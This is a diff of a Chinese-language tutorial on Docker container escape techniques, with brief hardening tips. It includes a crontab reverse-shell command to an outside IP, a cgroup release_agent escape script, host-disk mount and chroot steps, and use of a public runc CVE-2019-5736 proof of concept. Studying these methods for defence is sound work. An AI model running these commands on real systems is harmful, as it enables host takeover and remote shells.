@@ -19,7 +19,7 @@ source: "MrWQ/vulnerability-paper"
 
 **1、docker daemon api未授权访问**
 
-漏洞原理：在使用docker swarm的时候，节点上会开放一个TCP端口2375，绑定在0.0.0.0上，如果我们使用HTTP的方式访问会返回404  利用思路：通过挂在宿主机的目录，写定时任务获取SHELL，从而逃逸。
+漏洞原理：在使用docker swarm的时候，节点上会开放一个TCP端口2375，绑定在0.0.0.0上，如果我们使用HTTP的方式访问会返回404  利用思路：通过挂在宿主机的目录，写定时任务获取SHELL，从而逃逸。
 
   
 
@@ -57,7 +57,7 @@ docker ps -a | grep rce
 
   
 
-访问ip:2375/version 
+访问ip:2375/version 
 
   
 
@@ -132,7 +132,7 @@ https://blog.51cto.com/u_11495268/2424414_
 
 Tips
 
-_AppArmor： https://www.cnblogs.com/zlhff/p/5464862.htmlSeccomp： https://en.wikipedia.org/wiki/Seccomp_
+_AppArmor： https://www.cnblogs.com/zlhff/p/5464862.htmlSeccomp： https://en.wikipedia.org/wiki/Seccomp_
 
 *   普通模式下，可以通过配置 AppArmor 或 Seccomp 相关安全选项 （如果未配置的话，容器引擎默认也会启用一些对应的默认配置） 对容器进行加固
     
@@ -228,7 +228,7 @@ mkdir uzju mount /dev/sda3 uzju/ chroot /uzju/
 
   
 
-查看宿主机的/etc/passwd 
+查看宿主机的/etc/passwd 
 
   
 
@@ -236,7 +236,7 @@ mkdir uzju mount /dev/sda3 uzju/ chroot /uzju/
 
   
 
-查看root目录 
+查看root目录 
 
   
 
@@ -248,17 +248,9 @@ mkdir uzju mount /dev/sda3 uzju/ chroot /uzju/
 
   
 
-Tips： chroot命令  chroot命令 用来在指定的根目录下运行指令。chroot，即 change root directory （更改 root 目录）。在 linux 系统中，系统默认的目录结构都是以/，即是以根 (root) 开始的。而在使用 chroot 之后，系统的目录结构将以指定的位置作为/位置。  把根目录换成指定的目的目录
+Tips： chroot命令  chroot命令 用来在指定的根目录下运行指令。chroot，即 change root directory （更改 root 目录）。在 linux 系统中，系统默认的目录结构都是以/，即是以根 (root) 开始的。而在使用 chroot 之后，系统的目录结构将以指定的位置作为/位置。  把根目录换成指定的目的目录
 
-Ps: 在这遇到一个问题 _https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/_ 参考了这篇文章，但是这篇文章说，使用以下命令  cat /proc/self/status | grep CapEff如果返回的值为0000003fffffffff就是特权模式启动，但是我在我的centos中发现返回的值为0000001fffffffff，我也是特权模式启动 。
-
-  
-
-
-
-  
-
-可是在Centos中的值如下图 
+Ps: 在这遇到一个问题 _https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/_ 参考了这篇文章，但是这篇文章说，使用以下命令  cat /proc/self/status | grep CapEff如果返回的值为0000003fffffffff就是特权模式启动，但是我在我的centos中发现返回的值为0000001fffffffff，我也是特权模式启动 。
 
   
 
@@ -266,7 +258,7 @@ Ps: 在这遇到一个问题 _https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%
 
   
 
-随后在ubuntu21.10的宿主机系统下载docker镜像ubuntu18.04，查看后发现结果为0000003fffffffff 
+可是在Centos中的值如下图 
 
   
 
@@ -274,7 +266,15 @@ Ps: 在这遇到一个问题 _https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%
 
   
 
-通过capsh命令可以看到，为0000001fffffffff和为0000003fffffffff就只相差一点 
+随后在ubuntu21.10的宿主机系统下载docker镜像ubuntu18.04，查看后发现结果为0000003fffffffff 
+
+  
+
+
+
+  
+
+通过capsh命令可以看到，为0000001fffffffff和为0000003fffffffff就只相差一点 
 
   
 
@@ -294,7 +294,7 @@ crontab -e * * * * * /bin/bash -i >& /dev/tcp/192.168.0.139/1234 0>&1
 
   
 
-等待反弹即可   
+等待反弹即可   
 
   
 
@@ -314,11 +314,11 @@ crontab -e * * * * * /bin/bash -i >& /dev/tcp/192.168.0.139/1234 0>&1
 
 /var/run/docker.sock是 Docker守护程序默认监听的 Unix 套接字。它也是一个用于从容器内与Docker守护进程通信的工具。
 
-**取自StackOverflow**Unix Sockets  术语套接字通常是指 IP 套接字。这些是绑定到端口（和地址）的端口，我们向其发送 TCP 请求并从中获取响应。
+**取自StackOverflow**Unix Sockets  术语套接字通常是指 IP 套接字。这些是绑定到端口（和地址）的端口，我们向其发送 TCP 请求并从中获取响应。
 
 另一种类型的 Socket 是 Unix Socket，这些套接字用于IPC（进程间通信）。它们也称为 Unix 域套接字 ( UDS )。Unix 套接字使用本地文件系统进行通信，而 IP 套接字使用网络。
 
-Docker 守护进程可以通过三种不同类型的 Socket 监听 Docker Engine API 请求：unix, tcp, and fd.  默认情况下，在 /var/run/docker.sock 中创建一个 unix 域套接字（或 IPC 套接字）
+Docker 守护进程可以通过三种不同类型的 Socket 监听 Docker Engine API 请求：unix, tcp, and fd.  默认情况下，在 /var/run/docker.sock 中创建一个 unix 域套接字（或 IPC 套接字）
 
   
 
@@ -474,7 +474,7 @@ docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubunt
   
 
 ```
-`# In the container``# 挂载宿主机cgroup，自定义一个cgroup，/tmp/cgrp/x``mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x``# 设置/tmp/cgrp/x的cgroup的notify_no_release和release_agent``#  设置/tmp/cgrp/x的notify_no_release属性设置为1，通过sed匹配出/etc/mtab中perdir=的路径,然后将路径+cmd写入/tmp/cgrp/release_agent``echo 1 > /tmp/cgrp/x/notify_on_release```host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` ```echo "$host_path/cmd" > /tmp/cgrp/release_agent``# 写入自定义命令``echo '#!/bin/sh' > /cmd``# 结果在当前目录的output文件中``echo "ps aux > $host_path/output" >> /cmd``chmod a+x /cmd``# 执行完sh -c之后，sh进程自动退出，cgroup /tmp/cgrp/x里不再包含任何任务，/tmp/cgrp/release_agent文件里的shell将被操作系统内核执行,达到了容器逃逸的效果``sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"`
+`# In the container``# 挂载宿主机cgroup，自定义一个cgroup，/tmp/cgrp/x``mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x``# 设置/tmp/cgrp/x的cgroup的notify_no_release和release_agent``#  设置/tmp/cgrp/x的notify_no_release属性设置为1，通过sed匹配出/etc/mtab中perdir=的路径,然后将路径+cmd写入/tmp/cgrp/release_agent``echo 1 > /tmp/cgrp/x/notify_on_release```host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` ```echo "$host_path/cmd" > /tmp/cgrp/release_agent``# 写入自定义命令``echo '#!/bin/sh' > /cmd``# 结果在当前目录的output文件中``echo "ps aux > $host_path/output" >> /cmd``chmod a+x /cmd``# 执行完sh -c之后，sh进程自动退出，cgroup /tmp/cgrp/x里不再包含任何任务，/tmp/cgrp/release_agent文件里的shell将被操作系统内核执行,达到了容器逃逸的效果``sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"`
 ```
 
   
@@ -483,7 +483,7 @@ docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubunt
 
   
 
-随后查看cat output 
+随后查看cat output 
 
   
 
@@ -505,7 +505,7 @@ cgroups 是Linux内核提供的一种可以限制单个进程或者多个进程�
     
 *   网络
     
-*   磁盘I/O 
+*   磁盘I/O 
     
 
   
@@ -560,7 +560,7 @@ git clone https://github.com/Frichetten/CVE-2019-5736-PoC CGO_ENABLED=0 GOOS=lin
 
   
 
-下载完之后改一下main.go   
+下载完之后改一下main.go   
 
   
 
@@ -568,7 +568,7 @@ git clone https://github.com/Frichetten/CVE-2019-5736-PoC CGO_ENABLED=0 GOOS=lin
 
   
 
-这里改成在宿主机的/tmp写一个UzJu 
+这里改成在宿主机的/tmp写一个UzJu 
 
   
 
@@ -576,7 +576,7 @@ git clone https://github.com/Frichetten/CVE-2019-5736-PoC CGO_ENABLED=0 GOOS=lin
 
   
 
-随后传入容器中 
+随后传入容器中 
 
   
 
@@ -584,7 +584,7 @@ git clone https://github.com/Frichetten/CVE-2019-5736-PoC CGO_ENABLED=0 GOOS=lin
 
   
 
-然后我们在宿主机的/tmp目录中写一个UzJu 
+然后我们在宿主机的/tmp目录中写一个UzJu 
 
   
 
@@ -592,7 +592,7 @@ git clone https://github.com/Frichetten/CVE-2019-5736-PoC CGO_ENABLED=0 GOOS=lin
 
   
 
-运行exp 
+运行exp 
 
   
 
@@ -600,7 +600,7 @@ git clone https://github.com/Frichetten/CVE-2019-5736-PoC CGO_ENABLED=0 GOOS=lin
 
   
 
-然后我们在宿主机尝试去exec进入该容器 
+然后我们在宿主机尝试去exec进入该容器 
 
   
 
@@ -608,7 +608,7 @@ git clone https://github.com/Frichetten/CVE-2019-5736-PoC CGO_ENABLED=0 GOOS=lin
 
   
 
-可以看到执行成功了 
+可以看到执行成功了 
 
   
 
@@ -701,7 +701,7 @@ git clone https://github.com/Frichetten/CVE-2019-5736-PoC CGO_ENABLED=0 GOOS=lin
 
 
 
-//  火线Zone //
+//  火线Zone //
 
 微信号 : huoxian_zone
 
